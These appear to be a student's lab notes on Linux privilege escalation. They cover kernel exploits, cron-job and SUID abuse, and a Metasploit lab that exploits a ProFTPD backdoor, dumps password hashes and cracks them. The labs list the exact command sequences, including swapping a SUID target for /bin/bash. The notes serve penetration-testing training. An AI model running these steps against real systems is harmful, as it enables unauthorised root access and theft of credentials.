### Linux Kernel Exploitation
kernel exploits on Linux will typically target vulnerabilities in the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell

- the process will differ based on the kernel version and distribution being targeted and the kernel exploit being used

- Privilege escalation on Linux systems will typically follow the following methodology 
-Identifying kernel vulnerabilities
-downloading compiling and transferring kernel exploits into the target system


### Exploiting misconfigured Cron Jobs
- Linux implements task scheduling through a utility called Cron
- Cron is a time based service that runs applications scripts and other commands repeatedly on a specified schedule

### Exploiting Misconfigured Cron Jobs 
this is  primarily because any script or command that is run by a cron job will run as the root user and will consquently provide us with root access

# Cron Jobs Gone Wild II Lab
	ls -l
	find / -name message
	ls -l /tmp/
	grep -nrl "/tmp/message" /usr
	ls -l /usr/local/share/copy.sh
	cat /usr/local/share/copy.sh
	sudo -l
	sudo su
	cd /root
	ls -l
	cat flag

## Exploiting SUID Binaries
in addition to the three main file access permissions (read, write, execute) linux also provides users with specialized permissions that can be utilized in specific situations one of these access permissions is the SUID (set Owner User ID) permission

- SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with "root" permissions it is to be noted however that the provision of elevate privileges is limited to the execution of the script and does not translate to elevation of privileges 
- access permissions - we will require executable permissions in order to execute the SUID binary

## Exploiting Setuid Programs
	ls -l
	file welcome
	strings welcome
	rm greetings
	cp /bin/bash greetings
	./welcome
	whoami
	cd /root/
	cat flag


## Password Cracker: Linux Lab
	nmap -sS -sV 192.229.31.3
	 /etc/init.d/postgresql start
	 msfconsole -q
	use exploit/unix/ftp/proftpd_133c_backdoor
	set RHOSTS 192.229.31.3
	exploit -z
	
	use post/linux/gather/hashdump
	set SESSION 1
	exploit

	use auxiliary/analyze/crack_linux
	set SHA512 true
	run
	